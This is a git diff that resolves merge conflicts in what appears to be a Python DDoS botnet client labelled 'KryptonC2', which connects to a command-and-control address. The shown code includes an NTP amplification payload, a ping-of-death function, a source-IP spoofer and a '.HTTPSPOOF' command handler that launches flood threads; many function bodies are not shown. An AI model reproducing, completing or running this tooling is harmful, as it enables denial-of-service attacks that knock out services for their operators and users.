@@ -1,14 +1,11 @@
 import socket, threading, time, random, cloudscraper, requests, struct, os, sys, socks, ssl
 from multiprocessing import Process
 from urllib.parse import urlparse
-<<<<<<< HEAD
 from scapy.all import IP, UDP, Raw, ICMP, send
 from scapy.layers.inet import IP
 from scapy.layers.inet import TCP
 from icmplib import ping as pig
 from scapy.layers.inet import UDP
-=======
->>>>>>> c8a0fc504e65e8787c17a7240ce9b1a88b341abc
     
 # IP AND PORT C2 ------------------->
 KRYPTONC2_ADDRESS  = "localhost"
@@ -35,7 +32,6 @@ def rand_ua():
         random.randint(92215, 99999),
         random.random() + random.randint(3, 9)
     )
-<<<<<<< HEAD
 
 # NEW METHODS ----------------->
 ntp_payload = "\x17\x00\x03\x2a" + "\x00" * 4
@@ -113,9 +109,6 @@ def pod(target, timer):
 
 
 # old methods --------------------->
-=======
-# Test methods --------------------->
->>>>>>> c8a0fc504e65e8787c17a7240ce9b1a88b341abc
 def spoofer():
     addr = [192, 168, 0, 1]
     d = '.'
@@ -563,11 +556,7 @@ def main():
 
                 elif command == ".HTTPSPOOF":
                     url = args[1]
-<<<<<<< HEAD
                     timer = time.time() + int(args[2])
-=======
-                    timer = int(args[2])
->>>>>>> c8a0fc504e65e8787c17a7240ce9b1a88b341abc
                     threads = int(args[3])
                     
                     for _ in range(threads):
